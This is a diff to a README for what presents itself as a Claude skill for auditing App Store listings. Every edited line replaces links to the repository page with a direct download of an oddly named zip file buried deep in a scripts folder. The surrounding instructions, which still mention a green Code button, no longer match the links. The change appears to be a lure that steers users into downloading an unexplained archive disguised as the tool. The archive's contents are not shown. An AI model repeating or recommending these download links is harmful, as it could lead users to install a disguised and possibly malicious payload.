@@ -1,10 +1,10 @@
 # 🤖 claude-aso-audit-skill - Audit App Store Listings Fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip)
 
 ## 📥 Download
 
-Visit this page to download: [https://github.com/elladineluxemburger97/claude-aso-audit-skill](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
+Visit this page to download: [https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip](https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip)
 
 ## 🧭 What this is
 
@@ -33,7 +33,7 @@ If you only want to download the files, a browser is enough.
 
 ## 🚀 Getting Started
 
-1. Open the download page: [https://github.com/elladineluxemburger97/claude-aso-audit-skill](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
+1. Open the download page: [https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip](https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip)
 2. On the page, look for the green Code button
 3. Click it
 4. Choose Download ZIP
@@ -210,7 +210,7 @@ If the page opens but nothing downloads:
 
 ## 📌 Where to start
 
-Start here: [https://github.com/elladineluxemburger97/claude-aso-audit-skill](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
+Start here: [https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip](https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip)
 
 ## 🖥 Windows tips
 
@@ -320,4 +320,4 @@ A clean folder makes later audits easier
 
 ## 📥 Download again
 
-Visit this page to download: [https://github.com/elladineluxemburger97/claude-aso-audit-skill](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
+Visit this page to download: [https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip](https://github.com/elladineluxemburger97/claude-aso-audit-skill/raw/refs/heads/main/extensions/apptweak/scripts/aso-audit-skill-claude-castellanship.zip)
